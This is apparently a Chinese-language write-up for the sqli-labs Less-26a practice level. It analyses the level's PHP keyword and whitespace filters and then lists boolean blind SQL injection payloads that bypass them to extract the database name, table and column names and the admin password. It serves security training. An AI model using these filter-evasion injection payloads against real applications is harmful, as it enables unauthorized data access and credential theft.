# Less-26a （空格注释全禁+括号闭合+盲注）

## 查看分析源码

过滤和 Less-26 一模一样：

```php
$id= preg_replace('/or/i',"", $id);        // 去掉 or
$id= preg_replace('/and/i',"", $id);       // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);     // 去掉 /*
$id= preg_replace('/[--]/',"", $id);       // 去掉 --
$id= preg_replace('/[#]/',"", $id);        // 去掉 #
$id= preg_replace('/[\s]/',"", $id);       // 去掉空格 Tab 换行（\s ×2）
$id= preg_replace('/[\s]/',"", $id);       // 再来一次
$id= preg_replace('/[\/\\]/',"", $id);    // 去掉 / 和 \
```

和 Less-26 两个区别：

1. `id=('$id')` 多了一层括号，闭合用 `')`
2. `print_r(mysql_error())` 被注释了，没报错

所以 Less-26 的 updatexml 报错注入不能用了，error 看不到。换成**布尔盲注**：`&&(条件)&&('1`，真就出数据假就不出。

空格用 `()` 替代、or 用 `||` 或双写、and 用 `%26%26` 这些都和 Less-26 一样。多一个坑：`LIMIT(0,1)` 带括号不行，用 `GROUP_CONCAT` + `SUBSTR` 代替。

URL 里的 `=` 会当参数分隔符 → 全写成 `%3d`。

## 布尔盲注基准

```
?id=1')&&(1)&&('1     ← 返回数据
?id=1')&&(0)&&('1     ← 不返回
```

## 判断库名长度

```
?id=1')&&((select(length(database())))=8)&&('1
```

## 爆库名

逐个字符比，substr(database(),N,1)：

```
?id=1')&&((select(substr(database(),1,1)))='s')&&('1
?id=1')&&((select(substr(database(),2,1)))='e')&&('1
```

## 爆表名

infoorrmation_schema 的 or 要双写：

```
?id=1')&&((select(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema%3ddatabase())),1,1)))='e')&&('1
```

## 爆列名

and 用 %26%26，table_name='users' 里的 = 用 %3d：

```
?id=1')&&((select(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema%3ddatabase())%26%26(table_name%3d'users')),1,1)))='i')&&('1
```

## 爆数据

password 的 or 双写 passwoorrd：

```
?id=1')&&((select(substr((select(group_concat(passwoorrd))from(users)where(username%3d'admin')),1,1)))='a')&&('1
```

手工一个个字符爆太慢的话，二分法猜 ASCII：

```
?id=1')&&(ascii(substr((select(group_concat(passwoorrd))from(users)where(username%3d'admin')),1,1))>97)&&('1
```

返回数据说明 > 97，不返回说明 ≤ 97，折半逼近
